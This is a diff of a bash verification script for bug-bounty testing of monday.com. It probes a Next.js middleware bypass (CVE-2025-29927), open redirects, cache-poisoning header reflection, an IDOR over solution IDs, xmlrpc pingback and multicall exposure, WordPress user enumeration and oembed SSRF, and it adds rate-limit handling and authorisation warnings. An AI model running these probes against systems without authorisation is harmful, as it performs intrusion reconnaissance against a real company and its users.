@@ -6,73 +6,157 @@
 # Cache probes always use a unique cache-buster so no real URL is poisoned.
 #
 #   bash tools/verify.sh              # all checks
-#   bash tools/verify.sh 01 06 09     # only these
+#   bash tools/verify.sh 01 06 09     # only these  <- PREFERRED, see below
 #
-# Only run this against a target you are authorised to test.
+# RATE LIMITING. monday.com sits behind Cloudflare and answers 429 with a
+# 17-byte "error code: 1015" body once you go too fast. A 429 run tells you
+# nothing: every check reports a failure that is really just the rate limiter.
+# So this script (a) pre-flights, (b) aborts after N consecutive 429s,
+# (c) backs off, (d) defaults to a slow pace. Run checks in small batches:
+#
+#   DELAY=6 bash tools/verify.sh 01 02 03
+#
+# Only run this against a target you are authorised to test. If the program
+# offers a researcher identification header or a testing allowlist, use it -
+# that is the supported way to avoid the rate limiter.
 
 set -uo pipefail
 
-DELAY="${DELAY:-1}"
+DELAY="${DELAY:-4}"                  # seconds between requests
+JITTER="${JITTER:-2}"                # + up to this many seconds, randomised
+RL_MAX="${RL_MAX:-3}"                # abort after this many consecutive 429s
 BID="${BID:-f8386b8abfa0c30976f388dea89ed0363ecb1df0}"
 UA="${UA:-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36}"
 OUT="${OUT:-verify-out}"
-mkdir -p "$OUT"
+SKIP_PREFLIGHT="${SKIP_PREFLIGHT:-0}"
+mkdir -p "$OUT/bodies"
 
 C_R=$'\033[31m'; C_G=$'\033[32m'; C_Y=$'\033[33m'; C_B=$'\033[1m'; C_0=$'\033[0m'
 WANT=("$@")
+RL_HITS=0
 
 want() { [ ${#WANT[@]} -eq 0 ] && return 0; for w in "${WANT[@]}"; do [ "$w" = "$1" ] && return 0; done; return 1; }
 hdr()  { printf '\n%s=== BUG-%s — %s%s\n' "$C_B" "$1" "$2" "$C_0"; }
 note() { printf '  %s>%s %s\n' "$C_Y" "$C_0" "$*"; }
 hit()  { printf '  %s!! %s%s\n' "$C_R" "$*" "$C_0"; }
 ok()   { printf '  %s.. %s%s\n' "$C_G" "$*" "$C_0"; }
+pace() { sleep "$(awk -v d="$DELAY" -v j="$JITTER" 'BEGIN{srand();print d+rand()*j}')"; }
 
-# code+size for a URL, extra curl args passed through
+# on-disk name for a saved response body
+tagof() { printf '%s' "$1" | tr -c 'A-Za-z0-9' '_' | cut -c1-70; }
+
+rl_abort() {
+  printf '\n%s================================================================%s\n' "$C_R" "$C_0"
+  printf '%s RATE LIMITED - aborting after %d consecutive 429s%s\n' "$C_R" "$RL_HITS" "$C_0"
+  printf '%s================================================================%s\n' "$C_R" "$C_0"
+  cat <<'MSG'
+  Cloudflare is returning 429 "error code: 1015" (a 17-byte body). Every
+  result from here on would be the rate limiter, not the application, so
+  there is nothing to learn by continuing.
+
+  What to do:
+    1. Stop all traffic to the target and wait. 1015 is time-based and
+       typically clears in minutes to about an hour.
+    2. Come back slower and in batches:
+         DELAY=8 bash tools/verify.sh 01 02 03
+    3. If you ran a crawler (katana, ffuf, dirsearch) against this host
+       recently, that is almost certainly what put you in the bucket -
+       the limiter counts your IP, not this script.
+    4. Check the bug bounty program policy for a researcher header or a
+       testing allowlist. That is the supported way to raise the limit.
+
+  Do not try to evade the limiter. Rotating IPs to get around a rate limit
+  is out of scope on essentially every program and can get you removed.
+MSG
+  exit 2
+}
+
+# track consecutive 429s and back off
+track() {
+  case "${1%% *}" in
+    429) RL_HITS=$((RL_HITS + 1))
+         [ "$RL_HITS" -ge "$RL_MAX" ] && rl_abort
+         note "429 (${RL_HITS}/${RL_MAX}) - backing off $((DELAY * 4))s"
+         sleep "$((DELAY * 4))" ;;
+    *)   RL_HITS=0 ;;
+  esac
+}
+
+# probe URL [curl args...] -> "CODE SIZE"; body saved under $OUT/bodies/
 probe() {
   local url="$1"; shift
-  curl -sS -o /dev/null -w '%{http_code} %{size_download}' -A "$UA" --max-time 20 "$@" "$url" 2>/dev/null || echo "ERR 0"
-  sleep "$DELAY"
+  local out
+  out=$(curl -sS -o "$OUT/bodies/$(tagof "$url")" -w '%{http_code} %{size_download}' \
+        -A "$UA" -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.9' \
+        --max-time 25 "$@" "$url" 2>/dev/null)
+  [ -z "$out" ] && out="ERR 0"
+  printf '%s' "$out"
+  pace
+  track "$out"
 }
+
 body() {
   local url="$1"; shift
-  curl -sS -A "$UA" --max-time 20 "$@" "$url" 2>/dev/null
-  sleep "$DELAY"
+  curl -sS -A "$UA" -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.9' \
+       --max-time 25 "$@" "$url" 2>/dev/null
+  pace
 }
+
 heads() {
   local url="$1"; shift
-  curl -sSI --suppress-connect-headers -A "$UA" --max-time 20 "$@" "$url" 2>/dev/null
-  sleep "$DELAY"
+  curl -sSI --suppress-connect-headers -A "$UA" --max-time 25 "$@" "$url" 2>/dev/null
+  pace
 }
+
+# ---------------------------------------------------------------- preflight
+if [ "$SKIP_PREFLIGHT" != "1" ]; then
+  printf '%s[preflight]%s checking whether we are already rate limited...\n' "$C_B" "$C_0"
+  pf=$(curl -sS -o /dev/null -w '%{http_code} %{size_download}' -A "$UA" \
+       --max-time 25 'https://monday.com/robots.txt' 2>/dev/null)
+  [ -z "$pf" ] && pf="ERR 0"
+  echo "  robots.txt -> $pf"
+  case "$pf" in
+    429*)      RL_HITS="$RL_MAX"; rl_abort ;;
+    ERR*|000*) hit "cannot reach the target at all - check network/DNS/proxy"; exit 3 ;;
+    *)         ok "not rate limited, proceeding at DELAY=${DELAY}s (+ up to ${JITTER}s jitter)" ;;
+  esac
+  pace
+fi
 
 # ---------------------------------------------------------------- BUG-01
 if want 01; then
 hdr 01 "Next.js middleware bypass (CVE-2025-29927)"
   note "version fingerprint"
-  heads https://monday.com/ | grep -iE 'x-powered-by|server:|x-nextjs' | sed 's/^/     /'
+  heads https://monday.com/ | grep -iE 'x-powered-by|^server:|x-nextjs' | sed 's/^/     /'
   body https://monday.com/nhp/_next/static/chunks/framework-355174a933119eba.js \
-    | grep -oE '"[0-9]+\.[0-9]+\.[0-9]+"' | sort -u | head -5 | sed 's/^/     react-ish version: /'
-  note "baseline vs x-middleware-subrequest on /"
+    | grep -oE '"[0-9]+\.[0-9]+\.[0-9]+"' | sort -u | head -5 | sed 's/^/     version string: /'
+  note "baseline vs x-middleware-subrequest"
   b=$(probe https://monday.com/)
   h1=$(probe https://monday.com/ -H 'x-middleware-subrequest: middleware')
   h2=$(probe https://monday.com/ -H 'x-middleware-subrequest: src/middleware')
   h3=$(probe https://monday.com/ -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware')
   echo "     baseline=$b  hdr1=$h1  hdr2=$h2  hdr3=$h3"
-  if [ "$b" != "$h1" ] || [ "$b" != "$h2" ] || [ "$b" != "$h3" ]; then
-    hit "response CHANGED with the header — retest against a genuinely gated path"
-  else
-    ok "no difference on / (expected; retest on an auth-gated path if you find one)"
-  fi
+  case "$b" in
+    429*|ERR*|000*) note "baseline was not a real response - this check proved nothing" ;;
+    *) if [ "$b" != "$h1" ] || [ "$b" != "$h2" ] || [ "$b" != "$h3" ]; then
+         hit "response CHANGED with the header - retest against a genuinely gated path"
+       else
+         ok "no difference on / (expected; retest on an auth-gated path if you find one)"
+       fi ;;
+  esac
 fi
 
 # ---------------------------------------------------------------- BUG-02
 if want 02; then
 hdr 02 "OAuth metadata / dynamic client registration"
   for e in oauth-authorization-server oauth-protected-resource api-catalog; do
-    r=$(probe "https://monday.com/.well-known/$e")
+    u="https://monday.com/.well-known/$e"
+    r=$(probe "$u")
     echo "     $e -> $r"
-    case "$r" in 200*) body "https://monday.com/.well-known/$e" > "$OUT/$e.json"
-                       grep -oE '"(registration|authorization|token|revocation|jwks_uri)_endpoint"[^,]*' "$OUT/$e.json" | sed 's/^/       /'
-                       grep -q registration_endpoint "$OUT/$e.json" && hit "registration_endpoint present — test unauthenticated POST manually" ;;
+    case "$r" in 200*)
+      f="$OUT/bodies/$(tagof "$u")"
+      grep -oE '"(registration|authorization|token|revocation|jwks_uri)_endpoint"[^,]*' "$f" | sed 's/^/       /'
+      grep -q registration_endpoint "$f" && hit "registration_endpoint present - test unauthenticated POST by hand" ;;
     esac
   done
 fi
@@ -83,10 +167,10 @@ hdr 03 "GraphQL schema"
   r=$(probe 'https://api.monday.com/v2/get_schema?format=sdl')
   echo "     get_schema?format=sdl -> $r"
   case "$r" in 200*)
-    body 'https://api.monday.com/v2/get_schema?format=sdl' > "$OUT/schema.sdl"
+    cp "$OUT/bodies/$(tagof 'https://api.monday.com/v2/get_schema?format=sdl')" "$OUT/schema.sdl"
     echo "     lines: $(wc -l < "$OUT/schema.sdl")"
-    echo "     types: $(grep -cE '^\s*type ' "$OUT/schema.sdl")   deprecated: $(grep -c deprecated "$OUT/schema.sdl")"
-    ok "saved $OUT/schema.sdl — diff it against developer.monday.com docs" ;;
+    echo "     types: $(grep -cE '^[[:space:]]*type ' "$OUT/schema.sdl")   deprecated: $(grep -c deprecated "$OUT/schema.sdl")"
+    ok "saved $OUT/schema.sdl - diff it against developer.monday.com docs" ;;
   esac
 fi
 
@@ -94,144 +178,192 @@ fi
 if want 04; then
 hdr 04 "MCP / agent-skills surface"
   for e in mcp.json agent-skills/index.json; do
-    r=$(probe "https://monday.com/.well-known/$e")
+    u="https://monday.com/.well-known/$e"
+    r=$(probe "$u")
     echo "     $e -> $r"
-    case "$r" in 200*) body "https://monday.com/.well-known/$e" > "$OUT/$(basename "$e")"
-                       head -c 400 "$OUT/$(basename "$e")" | sed 's/^/       /'; echo ;;
-    esac
+    case "$r" in 200*) head -c 400 "$OUT/bodies/$(tagof "$u")" | sed 's/^/       /'; echo ;; esac
   done
 fi
 
 # ---------------------------------------------------------------- BUG-05
 if want 05; then
 hdr 05 "cache-key / normalisation mismatch"
-  note "same resource with and without %20 (cache status)"
-  heads 'https://monday.com/partners/aws/'    | grep -iE 'cf-cache-status|age:|vary' | sed 's/^/     plain  /'
-  heads 'https://monday.com/partners/aws/%20' | grep -iE 'cf-cache-status|age:|vary' | sed 's/^/     %20    /'
-  heads 'https://monday.com//workcanvas.com'  | grep -iE 'cf-cache-status|location'  | sed 's/^/     dslash /'
+  note "same resource with and without %20"
+  heads 'https://monday.com/partners/aws/'    | grep -iE 'cf-cache-status|^age:|^vary' | sed 's/^/     plain  /'
+  heads 'https://monday.com/partners/aws/%20' | grep -iE 'cf-cache-status|^age:|^vary' | sed 's/^/     %20    /'
+  heads 'https://monday.com//workcanvas.com'  | grep -iE 'cf-cache-status|^location'   | sed 's/^/     dslash /'
   note "unkeyed header reflection (unique cache-buster, safe)"
   CB="cb$RANDOM$RANDOM"
-  body "https://monday.com/?$CB=1" -H 'X-Forwarded-Host: canary.example' > "$OUT/cp1.html"
-  n=$(grep -c 'canary.example' "$OUT/cp1.html")
-  echo "     reflections of injected host: $n"
-  [ "$n" -gt 0 ] && hit "X-Forwarded-Host is reflected — check whether it caches for others"
-  [ "$n" -eq 0 ] && ok "no reflection"
+  u="https://monday.com/?$CB=1"
+  r=$(probe "$u" -H 'X-Forwarded-Host: canary.example')
+  echo "     injected request -> $r"
+  case "$r" in
+    200*) n=$(grep -c 'canary.example' "$OUT/bodies/$(tagof "$u")")
+          echo "     reflections of injected host: $n"
+          [ "$n" -gt 0 ] && hit "X-Forwarded-Host reflected - check whether it caches for others"
+          [ "$n" -eq 0 ] && ok "no reflection" ;;
+    *)    note "response was not 200 - reflection count would be meaningless" ;;
+  esac
 fi
 
 # ---------------------------------------------------------------- BUG-06
 if want 06; then
 hdr 06 "_next/data JSON endpoints"
-  r=$(probe "https://monday.com/nhp/_next/static/$BID/_buildManifest.js")
+  u="https://monday.com/nhp/_next/static/$BID/_buildManifest.js"
+  r=$(probe "$u")
   echo "     _buildManifest.js -> $r"
-  case "$r" in 200*)
-    body "https://monday.com/nhp/_next/static/$BID/_buildManifest.js" > "$OUT/_buildManifest.js"
-    grep -oE '"/[^"]*"' "$OUT/_buildManifest.js" | tr -d '"' | grep -v '\.js$' | sort -u > "$OUT/routes.txt"
-    echo "     routes discovered: $(wc -l < "$OUT/routes.txt")"
-    ok "saved $OUT/routes.txt"
-    note "sampling first 5 data endpoints"
-    head -5 "$OUT/routes.txt" | while read -r rt; do
-      echo "     $rt -> $(probe "https://monday.com/_next/data/$BID${rt}.json")"
-    done ;;
+  case "$r" in
+    200*) cp "$OUT/bodies/$(tagof "$u")" "$OUT/_buildManifest.js"
+          grep -oE '"/[^"]*"' "$OUT/_buildManifest.js" | tr -d '"' | grep -v '\.js$' | sort -u > "$OUT/routes.txt"
+          echo "     routes discovered: $(wc -l < "$OUT/routes.txt")"
+          ok "saved $OUT/routes.txt"
+          note "sampling first 5 data endpoints"
+          head -5 "$OUT/routes.txt" | while read -r rt; do
+            echo "     $rt -> $(probe "https://monday.com/_next/data/$BID${rt}.json")"
+          done ;;
+    404*) note "build ID is stale - re-read it from the homepage HTML (grep buildId)" ;;
   esac
 fi
 
-# ---------------------------------------------------------------- BUG-07/08
+# ---------------------------------------------------------------- BUG-07
 if want 07; then
 hdr 07 "solution_id IDOR (bounded sample)"
-  for id in 10005145 10005151 10005560 10005565 10005919 10016423 80437; do
-    echo "     $id -> $(probe "https://auth.monday.com/solutions/add_solution?solution_id=$id")"
+  note "a 302 here is most likely 'redirect to login' - compare against the known-good id"
+  for id in 80436 10005145 10005151 10005560 10005565 10005919 10016423 80437; do
+    r=$(probe "https://auth.monday.com/solutions/add_solution?solution_id=$id")
+    lbl=""; [ "$id" = "80436" ] && lbl="  (known-good)"
+    echo "     $id -> $r$lbl"
   done
-  note "compare against a known-good id"
-  echo "     80436 (known) -> $(probe 'https://auth.monday.com/solutions/add_solution?solution_id=80436')"
+  note "compare the saved bodies before calling anything a finding:"
+  note "  ls -l $OUT/bodies/ | grep solution"
 fi
 
+# ---------------------------------------------------------------- BUG-08
 if want 08; then
 hdr 08 "share-token enforcement / marketplace IDs"
-  echo "     no token      -> $(probe 'https://view.monday.com/4923960784')"
-  echo "     wrong token   -> $(probe 'https://view.monday.com/4923960784-00000000000000000000000000000000')"
-  echo "     real token    -> $(probe 'https://view.monday.com/4923960784-912829ab7717efb7fb86898ff6f59cbb')"
+  note "view.monday.com is an SPA: it returns 200 even when the token is wrong."
+  note "Judge by body content and size, never by status code."
+  a=$(probe 'https://view.monday.com/4923960784')
+  b=$(probe 'https://view.monday.com/4923960784-00000000000000000000000000000000')
+  c=$(probe 'https://view.monday.com/4923960784-912829ab7717efb7fb86898ff6f59cbb')
+  echo "     no token    -> $a"
+  echo "     wrong token -> $b"
+  echo "     real token  -> $c"
+  sa=${a##* }; sc=${c##* }
+  if [ "$sa" != "0" ] && [ "$sc" != "0" ] && [ "$sc" -gt 0 ]; then
+    if [ "$sa" -lt "$((sc / 2))" ]; then
+      ok "tokenless response is far smaller than the real one - token looks enforced"
+    else
+      hit "tokenless response is comparable in size to the real one - inspect the bodies"
+    fi
+  fi
+  note "diff them:  ls $OUT/bodies/ | grep view_monday"
   for id in 10 11 13 21 22 24 132 10000006; do
     echo "     marketplace/$id -> $(probe "https://monday.com/marketplace/$id")"
   done
 fi
 
-# ---------------------------------------------------------------- BUG-09/10/11
+# ---------------------------------------------------------------- BUG-09
 if want 09; then
 hdr 09 "WordPress core version"
   body https://monday.com/l/ | grep -oE 'content="WordPress [0-9.]+"' | sed 's/^/     meta: /'
   body https://monday.com/l/feed/ | grep -iE '<generator>' | sed 's/^/     feed: /'
   echo "     asset ?ver= stamps from crawl: 6.7.1 (core), jQuery 3.7.1, migrate 3.4.1"
-  note "6.7.1 shipped Nov 2024 — check it against current security releases"
+  note "6.7.1 shipped Nov 2024 - check it against current security releases"
 fi
 
+# ---------------------------------------------------------------- BUG-10
 if want 10; then
 hdr 10 "word-2-html plugin 1.0.59"
   echo "     readme.txt -> $(probe 'https://monday.com/l/wp-content/plugins/word-2-html/readme.txt')"
-  body 'https://monday.com/l/wp-content/plugins/word-2-html/readme.txt' | grep -iE 'stable tag|tested up to|requires' | sed 's/^/     /'
+  body 'https://monday.com/l/wp-content/plugins/word-2-html/readme.txt' \
+    | grep -iE 'stable tag|tested up to|requires' | sed 's/^/     /'
   echo "     plugin dir -> $(probe 'https://monday.com/l/wp-content/plugins/word-2-html/')"
 fi
 
+# ---------------------------------------------------------------- BUG-11
 if want 11; then
 hdr 11 "directory listings"
   for p in /l/wp-content/cache/min/1/ /l/wp-content/cache/min/ /l/wp-content/cache/ \
            /l/wp-content/uploads/ /l/wp-content/plugins/ /l/wp-content/themes/airfleet/; do
     r=$(probe "https://monday.com$p")
     echo "     $p -> $r"
-    case "$r" in 200*) hit "200 on $p — confirm it is an index listing, not a page" ;; esac
+    case "$r" in 200*) hit "200 on $p - confirm it is an index listing, not a page" ;; esac
   done
 fi
 
 # ---------------------------------------------------------------- BUG-12
 if want 12; then
 hdr 12 "open redirect: origin param and // paths"
-  for v in 'https://example.org' '//example.org' 'https://monday.com.example.org' '/\/example.org'; do
-    loc=$(heads "https://auth.monday.com/users/sign_up_new?origin=$(printf %s "$v" | sed 's|/|%2F|g;s|:|%3A|g')" | grep -i '^location:' | tr -d '\r')
-    echo "     origin=$v -> ${loc:-<no redirect>}"
+  for v in 'https://example.org' '//example.org' 'https://monday.com.example.org'; do
+    enc=$(printf %s "$v" | sed 's|/|%2F|g;s|:|%3A|g')
+    out=$(heads "https://auth.monday.com/users/sign_up_new?origin=$enc")
+    code=$(printf '%s' "$out" | grep -oE '^HTTP/[0-9.]+ [0-9]+' | tail -1)
+    loc=$(printf '%s' "$out" | grep -i '^location:' | tr -d '\r')
+    echo "     origin=$v -> ${code:-?} ${loc:-<no redirect>}"
     case "$loc" in *example.org*) hit "off-domain redirect" ;; esac
+    case "$code" in *429) note "429 - this row proved nothing" ;; esac
   done
-  loc=$(heads 'https://monday.com//example.org' | grep -i '^location:' | tr -d '\r')
+  out=$(heads 'https://monday.com//example.org')
+  loc=$(printf '%s' "$out" | grep -i '^location:' | tr -d '\r')
   echo "     //example.org -> ${loc:-<no redirect>}"
 fi
 
-# ---------------------------------------------------------------- BUG-13/14
+# ---------------------------------------------------------------- BUG-13
 if want 13; then
 hdr 13 "xmlrpc.php capability probe"
   r=$(probe https://monday.com/l/xmlrpc.php)
   echo "     GET xmlrpc.php -> $r"
-  m=$(body https://monday.com/l/xmlrpc.php -X POST -H 'Content-Type: text/xml' \
-      --data '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
-      | grep -oE '<string>[^<]+</string>' | sed 's/<[^>]*>//g')
-  echo "$m" | head -20 | sed 's/^/     /'
-  echo "$m" | grep -q 'pingback.ping'    && hit "pingback.ping available (blind SSRF primitive)"
-  echo "$m" | grep -q 'system.multicall' && hit "system.multicall available (login rate-limit amplification)"
-  [ -z "$m" ] && ok "no methods returned"
+  case "$r" in
+    429*|000*|ERR*) note "rate limited or unreachable - the POST below would be meaningless" ;;
+    *)
+      m=$(body https://monday.com/l/xmlrpc.php -X POST -H 'Content-Type: text/xml' \
+          --data '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
+          | grep -oE '<string>[^<]+</string>' | sed 's/<[^>]*>//g')
+      echo "$m" | head -20 | sed 's/^/     /'
+      echo "$m" | grep -q 'pingback.ping'    && hit "pingback.ping available (blind SSRF primitive)"
+      echo "$m" | grep -q 'system.multicall' && hit "system.multicall available (login rate-limit amplification)"
+      [ -z "$m" ] && ok "no methods returned" ;;
+  esac
 fi
 
+# ---------------------------------------------------------------- BUG-14
 if want 14; then
 hdr 14 "WordPress user enumeration"
-  r=$(probe 'https://monday.com/l/wp-json/wp/v2/users')
+  u='https://monday.com/l/wp-json/wp/v2/users'
+  r=$(probe "$u")
   echo "     wp/v2/users -> $r"
-  case "$r" in 200*) body 'https://monday.com/l/wp-json/wp/v2/users' | head -c 500 | sed 's/^/     /'; echo
-                     hit "users endpoint readable" ;; esac
-  loc=$(heads 'https://monday.com/l/?author=1' | grep -i '^location:' | tr -d '\r')
+  case "$r" in 200*)
+    head -c 500 "$OUT/bodies/$(tagof "$u")" | sed 's/^/     /'; echo
+    hit "users endpoint readable" ;;
+  esac
+  out=$(heads 'https://monday.com/l/?author=1')
+  loc=$(printf '%s' "$out" | grep -i '^location:' | tr -d '\r')
   echo "     ?author=1 -> ${loc:-<no redirect>}"
   case "$loc" in *author*) hit "author slug disclosed via redirect" ;; esac
 fi
 
-# ---------------------------------------------------------------- BUG-15/16
+# ---------------------------------------------------------------- BUG-15
 if want 15; then
 hdr 15 "cleartext links and HSTS"
   heads 'http://auth.monday.com/solutions/add_solution?solution_id=80436' | head -3 | sed 's/^/     /'
-  heads https://monday.com/ | grep -i 'strict-transport-security' | sed 's/^/     /'
+  h=$(heads https://monday.com/ | grep -i 'strict-transport-security' | tr -d '\r')
+  echo "     ${h:-<no HSTS header>}"
+  case "$h" in
+    *preload*) ok "HSTS includes preload" ;;
+    *max-age*) hit "HSTS present but NO preload directive - a first-ever request to a monday.com host can go in cleartext" ;;
+  esac
 fi
 
+# ---------------------------------------------------------------- BUG-16
 if want 16; then
 hdr 16 "Cloudflare email obfuscation"
-  body https://monday.com/l/legal/tos/ | grep -oE 'data-cfemail="[0-9a-f]+"' | head -5 | sed 's/^/     /'
-  note "decode: k=int(h[:2],16); chr(int(h[i:i+2],16)^k) for i in range(2,len(h),2)"
+  e=$(body https://monday.com/l/legal/tos/ | grep -oE 'data-cfemail="[0-9a-f]+"' | head -5)
+  if [ -n "$e" ]; then printf '     %s\n' $e; else note "no data-cfemail found (rate limited, or none on that page)"; fi
+  note "decode: k=int(h[:2],16); ''.join(chr(int(h[i:i+2],16)^k) for i in range(2,len(h),2))"
 fi
 
-# ---------------------------------------------------------------- BUG-19/20
+# ---------------------------------------------------------------- BUG-19
 if want 19; then
 hdr 19 "region parameter validation"
   for v in use1 euc1 apse2 xxxx; do
@@ -239,14 +371,22 @@ hdr 19 "region parameter validation"
   done
 fi
 
+# ---------------------------------------------------------------- BUG-20
 if want 20; then
 hdr 20 "parameter reflection + oembed SSRF"
   CAN="zzq$RANDOM"
-  n=$(body "https://monday.com/crm?selectedTag=$CAN" | grep -c "$CAN")
-  echo "     selectedTag reflections: $n"
-  [ "$n" -gt 0 ] && hit "selectedTag reflected — check encoding context"
+  u="https://monday.com/crm?selectedTag=$CAN"
+  r=$(probe "$u")
+  echo "     selectedTag request -> $r"
+  case "$r" in
+    200*) n=$(grep -c "$CAN" "$OUT/bodies/$(tagof "$u")")
+          echo "     reflections: $n"
+          [ "$n" -gt 0 ] && hit "selectedTag reflected - check the encoding context" ;;
+    *)    note "not 200 - reflection check skipped" ;;
+  esac
   echo "     oembed embed?url=external -> $(probe 'https://monday.com/l/wp-json/oembed/1.0/embed?url=https://example.org/')"
   echo "     oembed proxy?url=external -> $(probe 'https://monday.com/l/wp-json/oembed/1.0/proxy?url=https://example.org/')"
 fi
 
-printf '\n%sdone — artefacts in %s/%s\n' "$C_B" "$OUT" "$C_0"
+printf '\n%sdone - response bodies saved in %s/bodies/%s\n' "$C_B" "$OUT" "$C_0"
+printf '%sAny check that showed 429 proved nothing. Re-run those later, slower.%s\n' "$C_Y" "$C_0"
